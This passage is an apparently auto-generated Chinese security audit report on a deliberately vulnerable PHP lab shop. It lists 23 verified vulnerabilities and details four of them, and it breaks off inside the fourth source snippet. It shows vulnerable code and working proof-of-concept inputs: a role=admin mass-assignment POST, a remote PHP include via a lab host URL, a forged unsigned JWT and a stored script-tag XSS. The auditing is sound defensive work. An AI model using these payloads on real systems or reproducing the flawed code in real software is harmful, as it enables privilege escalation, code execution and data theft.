# 源码审计完整终审报告（2969bcf2）

> 报告类型：完整终审报告；发布状态：可发布（完整终审）
> 事实包 final-review/v1 · 渲染器 final-report/v2 · 策略 audit-runtime-3
> 运行 `2969bcf204cd43b5baf2683cbb0e841d` · 快照 `586b79b41f8e4f59be80f2a9b548902b` · 源码哈希 `67fd87e9ae771d10…` · 输入哈希 `1c48ce503c8af9140bbce4025b742bbbf27145e02ea80606fa636813f97ff940`
> 本报告由宿主从冻结事实包确定性生成；数量、位置、验证状态与评分均不由模型填写。

## 1. 执行与终审摘要

- 运行：`2969bcf204cd43b5baf2683cbb0e841d`；状态：completed；停止原因：goal_met；现有源码任务和覆盖已结算，进入统一证据终审。
- 审计完整性：完成（状态、覆盖与验证均闭环）
- 报告类型：final；发布状态：可发布（完整终审）

- 原始记录：30
- 有效记录：23
- 规范结论：23
- 已接受漏洞：23
- 待终审：0
- 存疑或排除：0

“已接受漏洞”以当前版本的正式终审处置为准：静态证据充分可接受；动态已验证结论还须完成同版本观测复核。其余结论逐条保留，不会因为缺少终审额度而从报告中消失。

| 完成维度 | 已完成 | 分母 | 说明 |
|---|---:|---:|---|
| 源码覆盖（读取） | 59 | 61 | 已读只表示宿主记录过读取 |
| 源码覆盖（读取+带理由跳过） | 61 | 61 | 跳过不是安全结论 |
| 必做方向结算 | 8 | 8 | 未决 0 个 |
| 动态验证完成 | 22 | 23 | 待验证 0 条 |
| 正式复核 | 23 | 23 | 复核存疑或未复核不计入已接受 |
| 源码覆盖（仍待复核） | 0 | 61 | 未读且未跳过 0 个 |

**已接受漏洞**

- C-01 account/update.php 批量赋值允许登录用户将自身 role/balance 改写（提权与余额篡改）（lab30-shop/app/public/account/update.php:6）
- C-02 template-preview.php 远程文件包含：include 直接使用用户 template 参数且 allow_url_include=On（lab30-shop/app/public/ops/template-preview.php:3）
- C-03 partner/portal.php 仅解码 JWT payload 不验签，构造 role=admin 令牌即可越权读取全部订单（lab30-shop/app/public/partner/portal.php:2）
- C-04 support/messages.php 留言内容未编码导致存储型 XSS（lab30-shop/app/public/support/messages.php:5）
- C-05 catalog/greeting.php 的 name 参数未编码导致反射型 XSS（lab30-shop/app/public/catalog/greeting.php:3）
- C-06 会员备份恢复对 POST 数据直接 unserialize 导致 PHP 对象注入（lab30-shop/app/public/account/backup.php:5）
- C-07 提现先读后写无锁，競态可重复扣减同一余额实现超额提现（lab30-shop/app/public/wallet/withdraw.php:7）
- C-08 orders/detail.php 仅按订单 id 查询、无用户归属校验，任意登录用户可读他人订单（lab30-shop/app/public/orders/detail.php:2）
- C-09 auth/continue.php 的 next 参数未校验即写入 Location 头，导致开放重定向（lab30-shop/app/public/auth/continue.php:3）
- C-10 订单创建信任客户端提交的 price，可任意低价下单（lab30-shop/app/public/orders/create.php:5）
- C-11 content/page.php 本地文件包含：未过滤 page 参数拼接 include 路径（lab30-shop/app/public/content/page.php:3）
- C-12 会员报表 nickname 二次 SQL 注入（用户资料写入后未参数化拼接）（lab30-shop/app/public/ops/report.php:3）
- C-13 xml-import.php 以 LIBXML_NOENT|LIBXML_DTDLOAD 解析用户 XML 造成 XXE 文件读取（lab30-shop/app/public/ops/xml-import.php:3）
- C-14 auth/login.php 接受 sid 参数指定会话 ID，登录后不重建会话导致会话固定（lab30-shop/app/public/auth/login.php:3）
- C-15 运营远程模板预览将 GET template 直接 include 造成任意本地文件包含（lab30-shop/app/public/ops/template-preview.php:3）
- C-16 account/profile.php 将 GET url 原样拼入 href，javascript: 伪协议反射型 XSS（lab30-shop/app/public/account/profile.php:3）
- C-17 任务导入 unserialize 用户数据触发 DispatchJob::__wakeup 的 shell_exec 命令执行（lab30-shop/app/public/ops/jobs.php:3）
- C-18 support/download.php 直接拼接 $_GET['file'] 到文档目录，导致任意文件读取（lab30-shop/app/public/support/download.php:3）
- C-19 商品目录搜索 q 参数直接拼接进 LIKE 查询（反射型 SQL 注入）（lab30-shop/app/public/catalog/index.php:4）
- C-20 运营主机巡检 host 参数未过滤直接拼接 shell_exec 造成命令注入（lab30-shop/app/public/ops/ping.php:2）
- C-21 运营模板渲染将 {{...}} 表达式直接传入 eval 造成代码执行（lab30-shop/app/public/ops/template-render.php:3）
- C-22 运营 URL 预览 GET url 直接交给 file_get_contents 造成 SSRF（lab30-shop/app/public/ops/url-preview.php:3）
- C-23 account/redeem.php 使用 == 比较 MD5，弱类型绕过兑换码免费升级金卡（lab30-shop/app/public/account/redeem.php:5）

## 2. 范围和方法

- 项目：39211162aa984b25b60228c194b531ae；快照：`586b79b41f8e4f59be80f2a9b548902b`
- 源码包哈希（archive sha256）：`67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c`
- 事实包：final-review/v1；渲染器：final-report/v2；模板哈希：`bae25eb461e0811b`
- 输入哈希：`1c48ce503c8af9140bbce4025b742bbbf27145e02ea80606fa636813f97ff940`；冻结时间：2026-10-30T14:45:20.904191+00:00；生成时间：2026-10-30T14:45:20.904191+00:00
- 模型配置：deepseek-flash；策略版本：audit-runtime-3

本次报告只使用宿主记录的冻结事实：源码引用由服务器从快照读取并核对哈希，动态验证取自隔离 runner 的作业记录，正式复核按 finding revision 与 verification id 精确引用。模型的结论陈述与修复建议以“结论陈述”标注，不作为证据；未执行、环境失败与验证不确定都不解释为误报。

| 预算 | 上限 | 实际使用 | 剩余 |
|---|---:|---:|---:|
| 模型响应 | 2048 | 254 | 1794 |
| 工具调用 | 16384 | 270 | 16114 |
| 秒 | 10800 | 2832.069 | 7967.9310000000005 |

- 上下文：峰值请求 150895 字节 / 上限 393216 字节；摘要请求 0 次；硬上限命中 0 次。

| 阶段 | 请求配额 | 已用 |
|---|---:|---:|
| 源码挖掘 | 105 | 105 |
| POC 验证 | 120 | 120 |
| 统一终审 | 1823 | 29 |
- 调度政策：host-queue-v1；配额：自动分配。
- 待终审 0 项，预计 0 批；当前预留 0 次请求、60 秒；按实际批次容量与 Worker 调整，不增加整次额度。
- POC 执行：。

## 3. 规范漏洞清单

| 编号 | 标题 | 类型 | 评分 | 位置 | 静态判读 | 动态验证 | 正式终审 | 处置 |
|---|---|---|---|---|---|---|---|---|
| C-01 | account/update.php 批量赋值允许登录用户将自身 role/balance 改写（提权与余额篡改） | mass_assignment | CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:… | lab30-shop/app/public/account/update.php:6 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-02 | template-preview.php 远程文件包含：include 直接使用用户 template 参数且 allo… | rfi | CVSS 3.1 Base 7.2 (high) · CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/template-preview.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-03 | partner/portal.php 仅解码 JWT payload 不验签，构造 role=admin 令牌即可越权读… | auth_bypass | CVSS 3.1 Base 8.6 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:… | lab30-shop/app/public/partner/portal.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-04 | support/messages.php 留言内容未编码导致存储型 XSS | xss_s | CVSS 3.1 待评分 | lab30-shop/app/public/support/messages.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-05 | catalog/greeting.php 的 name 参数未编码导致反射型 XSS | xss_r | CVSS 3.1 待评分 | lab30-shop/app/public/catalog/greeting.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-06 | 会员备份恢复对 POST 数据直接 unserialize 导致 PHP 对象注入 | insecure_deserialization | CVSS 3.1 待评分 | lab30-shop/app/public/account/backup.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-07 | 提现先读后写无锁，競态可重复扣减同一余额实现超额提现 | race_condition | CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/… | lab30-shop/app/public/wallet/withdraw.php:7 | 缺上下文（2 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-08 | orders/detail.php 仅按订单 id 查询、无用户归属校验，任意登录用户可读他人订单 | idor | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/… | lab30-shop/app/public/orders/detail.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-09 | auth/continue.php 的 next 参数未校验即写入 Location 头，导致开放重定向 | open_redirect | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/… | lab30-shop/app/public/auth/continue.php:3 | 缺上下文（1 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-10 | 订单创建信任客户端提交的 price，可任意低价下单 | price_manipulation | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/… | lab30-shop/app/public/orders/create.php:5 | 缺上下文（2 项） | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-11 | content/page.php 本地文件包含：未过滤 page 参数拼接 include 路径 | lfi | CVSS 3.1 Base 5.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/… | lab30-shop/app/public/content/page.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-12 | 会员报表 nickname 二次 SQL 注入（用户资料写入后未参数化拼接） | sqli | CVSS 3.1 Base 4.8 (medium) · CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/… | lab30-shop/app/public/ops/report.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-13 | xml-import.php 以 LIBXML_NOENT&#124;LIBXML_DTDLOAD 解析用户 XML 造… | xxe | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/… | lab30-shop/app/public/ops/xml-import.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-14 | auth/login.php 接受 sid 参数指定会话 ID，登录后不重建会话导致会话固定 | session_fixation | CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:… | lab30-shop/app/public/auth/login.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-15 | 运营远程模板预览将 GET template 直接 include 造成任意本地文件包含 | lfi | CVSS 3.1 Base 7.6 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:… | lab30-shop/app/public/ops/template-preview.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-16 | account/profile.php 将 GET url 原样拼入 href，javascript: 伪协议反射型 X… | xss_r | CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/… | lab30-shop/app/public/account/profile.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-17 | 任务导入 unserialize 用户数据触发 DispatchJob::__wakeup 的 shell_exec 命… | insecure_deserialization | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/jobs.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-18 | support/download.php 直接拼接 $_GET['file'] 到文档目录，导致任意文件读取 | path_traversal | CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/… | lab30-shop/app/public/support/download.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-19 | 商品目录搜索 q 参数直接拼接进 LIKE 查询（反射型 SQL 注入） | sqli | CVSS 3.1 Base 8.2 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:… | lab30-shop/app/public/catalog/index.php:4 | 证据已记录 | 不确定（不确定） | 未复核 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-20 | 运营主机巡检 host 参数未过滤直接拼接 shell_exec 造成命令注入 | command_injection | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/ping.php:2 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-21 | 运营模板渲染将 {{...}} 表达式直接传入 eval 造成代码执行 | code_execution | CVSS 3.1 Base 8.8 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:… | lab30-shop/app/public/ops/template-render.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-22 | 运营 URL 预览 GET url 直接交给 file_get_contents 造成 SSRF | ssrf | CVSS 3.1 Base 4.3 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/… | lab30-shop/app/public/ops/url-preview.php:3 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |
| C-23 | account/redeem.php 使用 == 比较 MD5，弱类型绕过兑换码免费升级金卡 | weak_type_comparison | CVSS 3.1 Base 3.1 (low) · CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N | lab30-shop/app/public/account/redeem.php:5 | 证据已记录 | 动态确认 | 复核确认 | 已接受：独立终审批次接受源码结论；动态验证状态单独保留 |

## 4. 逐条漏洞详单

### C-01 account/update.php 批量赋值允许登录用户将自身 role/balance 改写（提权与余额篡改）

- 当前版本：finding `618fed4dab94434c9f2d11308ca4829e` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/account/update.php:6`；文件：`lab30-shop/app/public/account/update.php`
- 证据引用：`aecff877ea34a4a4` lab30-shop/app/public/account/update.php:1-9；`78224482780bf94a` lab30-shop/app/src/bootstrap.php:33-37；`6700e4b97da566f5` lab30-shop/app/src/bootstrap.php:53-53
- 根因类别：task_goal:v2:dff2dd466d070894729b:1（规范类型 mass_assignment）

**结论陈述（模型产出，不是证据）**

update.php 定义可更新列 $columns=['display_name','email','role','balance','tier','nickname','homepage']，随后对 $_POST 每个键判断在白名单内即拼接 `key`=? 并写入 UPDATE users SET ... WHERE id=?。虽然 WHERE 限定为当前用户自身行（$u['id'] 来自会话查询），但允许字段包含 role、balance、tier 等敏感列，服务端未做任何字段级授权限制。任意已登录普通用户提交 role=admin 即可获得运营/管理入口权限（如 /ops/index.php），提交 balance=999999 即可篡改账户余额。表单页面本身只渲染 display_name/nickname/email/homepage，但服务端接受隐藏字段，属于典型的服务端缺少字段许可集合校验。

- 攻击前身份与适用前提：攻击者拥有任意已登录普通账户；CSRF token 可从同页表单获取
- 入口 → 传播 → 危险操作/状态变更：POST 参数 role/balance/tier（客户端可任意附加表单字段） → update.php:5 foreach $_POST 过滤后加入 $set/$values → update.php:6 拼接 UPDATE users SET 并执行 → UPDATE users SET role=?,balance=? WHERE id=<当前用户>
- 防护与边界：check_csrf 仅防 CSRF；$columns 白名单仍包含敏感列；无角色/字段级授权检查
- 静态判读：证据已记录
- 动态验证：动态确认（verification `527664d39fc849c687a649bbdda28f1a`）
- 正式终审：独立批次 5a97dca1a4554a6584f38a4485161ec4；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

同一 alice 会话中，附加隐藏字段提交 role=admin&balance=999999（csrf 取自真实表单）后，读取当前用户 JSON 变为 id=1、username=alice、display_name=norm、email=alice@shop.local、role=admin、balance=999999.00、tier=standard。普通会员通过 $_POST 白名单内的 role/balance 字段把自身改为管理员并篡改余额；update.php:5 把所有白名单键直接加入 SET 子句，未做字段级授权限制，update.php:6 以参数化方式执行该 UPDATE（仅防注入，不防字段越权）。

- 评分依据：CVSS 3.1 Base 7.1 (high) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：未提供

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/account/update.php:1-9`（sha256 `b8227f19c05d0cd3…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();$notice='';
    3  if($_SERVER['REQUEST_METHOD']==='POST'){
    4      check_csrf();$columns=['display_name','email','role','balance','tier','nickname','homepage'];$set=[];$values=[];
    5      foreach($_POST as$key=>$value)if(in_array($key,$columns,true)){$set[]='`'.$key.'`=?';$values[]=(string)$value;}
    6      if(!$set)fail_request('没有可更新的资料。');$values[]=$u['id'];db()->prepare('UPDATE users SET '.implode(',',$set).' WHERE id=?')->execute($values);event_log('update_profile',['fields'=>array_keys($_POST)]);$notice='资料已保存。';$u=user();
    7      if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response($u);
    8  }
    9  page('会员资料维护',function()use($u,$notice){echo '<section class="panel narrow">';if($notice)echo '<div class="notice">'.h($notice).'</div>';echo '<form method="post">'.csrf_field();form_input('display_name','显示名称',$u['display_name']);form_input('nickname','对外昵称',$u['nickname']);form_input('email','常用邮箱',$u['email'],'email');form_input('homepage','个人网站',$u['homepage']);echo '<button>保存资料</button></form></section>';},'账户与会员');
```

`lab30-shop/app/src/bootstrap.php:33-37`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
   37  }
```

`lab30-shop/app/src/bootstrap.php:53-53`（sha256 `2050819d093be02b…`）

```php
   53      if (!$u || !in_array($u['role'], ['operator','admin'], true)) unset($nav['/ops/index.php']);
```

### C-02 template-preview.php 远程文件包含：include 直接使用用户 template 参数且 allow_url_include=On

- 当前版本：finding `633719c82cd64d56bc043d63f5b5df83` revision 1（项目版本 17）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/ops/template-preview.php:3`；文件：`lab30-shop/app/public/ops/template-preview.php`
- 证据引用：`5d596a817dad3c10` lab30-shop/app/public/ops/template-preview.php:1-3；`38c5cad78d49b7f3` lab30-shop/docker/php.ini:1-13；`6d302fb291c9a00a` lab30-shop/fixtures/server.py:16-17
- 根因类别：task_goal:v2:3fa03d1b8a8a72b9ba3d:1（规范类型 rfi）

**结论陈述（模型产出，不是证据）**

$_GET['template'] 直接传入 include，未做协议/域名/路径校验。php.ini:3 allow_url_include=On 使 http:// 远程 PHP 被当作代码执行。fixtures/server.py:16-17 演示了 /templates/season.php 返回 PHP 内容，攻击者可自建 HTTP 服务返回恶意 PHP 实现 RCE。需 operator/admin 角色，属于提权/横向利用。

- 攻击前身份与适用前提：已登录 operator 或 admin 账号
- 入口 → 传播 → 危险操作/状态变更：GET /ops/template-preview.php?template= → template-preview.php:2 取 $_GET['template'] -> :3 include $template → include 用户完全可控的 URL
- 防护与边界：仅 require_user 角色检查；无协议白名单；allow_url_include=On
- 静态判读：证据已记录
- 动态验证：动态确认（verification `e6f298c9f79841d59a03567c9e92d624`）
- 正式终审：独立批次 5a97dca1a4554a6584f38a4485161ec4；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧（operator 会话）：GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 200，远端内容被 include 并执行，remote-template 区块实际渲染出 '<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>'，页面中不含字面量 '<?php'；而 fixtures/server.py:17 显示该 URL 的原始响应体就是这段 PHP 源码，故渲染结果只能来自服务端包含并执行远端 PHP。另以 template=http://fixtures:8080/catalog-info 返回 200，remote-template 区块为远端纯文本“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”，说明 include 目标 URL 完全由请求参数决定，服务端会向任意给定地址发起包含请求。

- 评分依据：CVSS 3.1 Base 7.2 (high) · CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：移除 include 动态 URL，改为白名单模板 ID；关闭 allow_url_include；设置 open_basedir。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/ops/template-preview.php:1-3`（sha256 `107da46e9b067ce0…`）

```php
    1  <?php
    2  require __DIR__.'/../../src/bootstrap.php';require_user(['operator','admin']);$template=(string)($_GET['template']??'');
    3  page('远程模板预览',function()use($template){echo '<section class="panel"><form method="get">';form_input('template','模板地址',$template?:'http://fixtures:8080/templates/season.php');echo '<button>加载模板</button></form></section><section class="panel" id="remote-template">';if($template!=='')include $template;echo '</section>';},'运营工作台');
```

`lab30-shop/docker/php.ini:1-13`（sha256 `b65de9007c7f42b3…`）

```
    1  date.timezone = Asia/Shanghai
    2  allow_url_fopen = On
    3  allow_url_include = On
    4  display_errors = Off
    5  log_errors = On
    6  error_reporting = E_ALL & ~E_DEPRECATED
    7  session.use_strict_mode = 0
    8  session.save_path = /var/lib/shop/sessions
    9  memory_limit = 128M
   10  post_max_size = 2M
   11  max_execution_time = 15
   12  default_socket_timeout = 4
   13  expose_php = Off
```

`lab30-shop/fixtures/server.py:16-17`（sha256 `730d9ef6e70ca6c6…`）

```
   16          elif path == '/templates/season.php':
   17              body, kind = '<?php echo "<h2>合作方 · 秋日生活提案</h2><p>让生活慢下来，把好物带回家。</p>"; ?>', 'text/plain'
```

### C-03 partner/portal.php 仅解码 JWT payload 不验签，构造 role=admin 令牌即可越权读取全部订单

- 当前版本：finding `966576d2146344879dcbedc45dc3fcca` revision 1（项目版本 1）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/partner/portal.php:2`；文件：`lab30-shop/app/public/partner/portal.php`
- 证据引用：`343d5e3158080141` lab30-shop/app/public/partner/portal.php:2-6；`ab54a1f06e186428` lab30-shop/app/public/partner/token.php:4-4
- 根因类别：task_goal:v2:c6d44f99f2df2205c6b0:1（规范类型 auth_bypass）

**结论陈述（模型产出，不是证据）**

portal.php 从 POST token 或 partner_token Cookie 取令牌，split 后用 base64_decode+json_decode 取出 payload 段，只要求 count===3 且数组且 role==='admin'，从不校验 header/签名段与 token.php 使用的 HMAC 密钥。任何访客（含未登录）可自制 header.payload.sig，将 payload 设为 {role:'admin'} 即通过第3行检查，第4行 SELECT 全部订单并在 HTML/JSON 输出订单号与金额。token.php 证明正规用户令牌结构公开且可获取，签名从未被服务端使用。

- 攻击前身份与适用前提：攻击者可直接向 /partner/portal.php POST 自造令牌，无需登录
- 入口 → 传播 → 危险操作/状态变更：$_POST['token'] 或 $_COOKIE['partner_token'] → token -> explode('.') -> base64_decode(parts[1]) -> json_decode -> $payload['role'] === 'admin' -> db()->query('SELECT order_no,total FROM orders') → 未验签的客户端声明成为 admin 身份断言，读取全部订单金额
- 防护与边界：无签名校验、无会话身份、无密钥比对；仅判断 payload 数组与 role 字符串
- 静态判读：证据已记录
- 动态验证：动态确认（verification `83288ac3d2a4459cadab3af2c227243c`）
- 正式终审：独立批次 7b49bd2a165148beb74a607692b0d912；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

攻击侧用无 cookie、未登录的独立 opener 向 /partner/portal.php POST 自造三段令牌（header=b64url({"alg":"none","typ":"JWT"})，payload=b64url({"role":"admin"}) 即 eyJyb2xlIjoiYWRtaW4ifQ，签名段仅为 'x'）：返回 200，JSON 为 {"role":"admin","settlements":[{"order_no":"SG-1001","total":"129.00"},{"order_no":"SG-1002","total":"158.00"}]}（HAS_ORDER True、ROLE_ADMIN True）。服务端未校验签名段与 HMAC 密钥，仅凭 payload 自述 role=admin 即放行并返回全部订单号与金额。

- 评分依据：CVSS 3.1 Base 8.6 (high) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：使用 token.php 相同的 HMAC 密钥对 header.payload 重新计算签名并用 hash_equals 校验，同时校验 exp/iss，并基于服务端会话判定角色而非令牌自述。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/public/partner/portal.php:2-6`（sha256 `e1267edb0f9df936…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$token=(string)($_POST['token']??$_COOKIE['partner_token']??'');$parts=explode('.',$token);$payload=count($parts)===3?json_decode((string)base64_decode(strtr($parts[1],'-_','+/')),true):null;
    3  if(!is_array($payload)||($payload['role']??'')!=='admin')fail_request('此合作方功能仅向管理员开放。',403);
    4  $rows=db()->query('SELECT order_no,total FROM orders ORDER BY id')->fetchAll();
    5  if(str_contains($_SERVER['HTTP_ACCEPT']??'','application/json'))json_response(['role'=>'admin','settlements'=>$rows]);
    6  page('合作方结算工作台',function()use($rows){echo '<section class="panel"><h2>结算摘要</h2><table><thead><tr><th>订单</th><th>金额</th></tr></thead><tbody>';foreach($rows as$r)echo '<tr><td>'.h($r['order_no']).'</td><td>¥'.h($r['total']).'</td></tr>';echo '</tbody></table></section>';});
```

`lab30-shop/app/public/partner/token.php:4-4`（sha256 `391948b46efce76c…`）

```php
    4  $header=b64url(json_encode(['alg'=>'HS256','typ'=>'JWT']));$payload=b64url(json_encode(['sub'=>$u['id'],'role'=>$u['role'],'name'=>$u['username']]));$key=db()->query("SELECT value FROM settings WHERE `key`='generation'")->fetchColumn();$token=$header.'.'.$payload.'.'.b64url(hash_hmac('sha256',$header.'.'.$payload,$key,true));
```

### C-04 support/messages.php 留言内容未编码导致存储型 XSS

- 当前版本：finding `43b0838f093d472c9143038ec56e1e96` revision 1（项目版本 21）；CVSS 评分版本 1
- 位置：`lab30-shop/app/public/support/messages.php:5`；文件：`lab30-shop/app/src/bootstrap.php`
- 证据引用：`5220b9ce518719f6` lab30-shop/app/src/bootstrap.php:10-10；`6220461f4c36cb1a` lab30-shop/app/src/bootstrap.php:33-36；`2ba1a6f9578aa5c7` lab30-shop/app/public/support/messages.php:2-5
- 根因类别：task_goal:v2:301d841cd3c920642c92:1（规范类型 xss_s）

**结论陈述（模型产出，不是证据）**

登录用户提交的 message 通过参数化 INSERT 存入 messages 表，渲染时第 5 行将 $row['message'] 直接拼接到 HTML 文本上下文，未调用 h()。攻击者可提交含脚本标签的留言，任何打开留言页的用户（含管理员）都会执行该脚本。

- 攻击前身份与适用前提：攻击者需登录账户；受害者（任意用户/管理员）访问 /support/messages.php
- 入口 → 传播 → 危险操作/状态变更：$_POST['message']（第3行）写入数据库，第5行读取 $row['message'] 输出 → POST message -> INSERT INTO messages -> SELECT m.* -> $row['message'] 拼接到 '<div class="message-body">' → echo 未编码的 $row['message'] 到 HTML
- 防护与边界：仅有 1-5000 字节长度与 CSRF 校验，无 HTML 编码；h() 已定义但未用于该输出点
- 静态判读：证据已记录
- 动态验证：动态确认（verification `f5237eca53984a20a3e3202acd001a93`）
- 正式终审：独立批次 d5f64cb796ee41358a821d1b6947975e；处置：已接受——独立终审批次接受源码结论；动态验证状态单独保留

**实际影响（来自动态验证观测）**

alice 先 GET /support/messages.php 取真实 csrf，再 POST message=<script>alert('XSS43b0838f')</script>；服务端参数化 INSERT 后 303 回到留言页，返回 HTML 中原样出现 <div class="message-body"><script>alert('XSS43b0838f')</script></div>（PAYLOAD_RAW_IN_PAGE True）。随后浏览器加载 /support/messages.php，实际弹出 dialog，dialogs=["XSS43b0838f"]，console_errors 为空，即脚本在受害者浏览页面时执行。

- 评分依据：CVSS 3.1 待评分；引擎 cvss31-base-1；适用结论版本 1
- 修复方案（结论陈述）：将该输出改为 '<div class="message-body">'.h($row['message']).'</div>'。

**源码片段（宿主从冻结快照读取）**

`lab30-shop/app/src/bootstrap.php:10-10`（sha256 `2050819d093be02b…`）

```php
   10  function h(mixed $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
```

`lab30-shop/app/src/bootstrap.php:33-36`（sha256 `2050819d093be02b…`）

```php
   33  function require_user(array $roles = []): array {
   34      $u = user(); if (!$u) fail_request('请先登录后使用此功能。', 401);
   35      if ($roles && !in_array($u['role'], $roles, true)) fail_request('当前账号没有访问该功能的权限。', 403);
   36      return $u;
```

`lab30-shop/app/public/support/messages.php:2-5`（sha256 `a6866f07b4de32f3…`）

```php
    2  require __DIR__.'/../../src/bootstrap.php';$u=require_user();
    3  if($_SERVER['REQUEST_METHOD']==='POST') {check_csrf();$message=(string)($_POST['message']??'');if($message===''||strlen($message)>5000)fail_request('留言需为 1–5000 字节。');db()->prepare('INSERT INTO messages(user_id,message) VALUES(?,?)')->execute([$u['id'],$message]);event_log('leave_message');header('Location: /support/messages.php',true,303);exit;}
    4  $rows=db()->query('SELECT m.*,u.display_name FROM messages m JOIN users u ON u.id=m.user_id ORDER BY m.id DESC')->fetchAll();
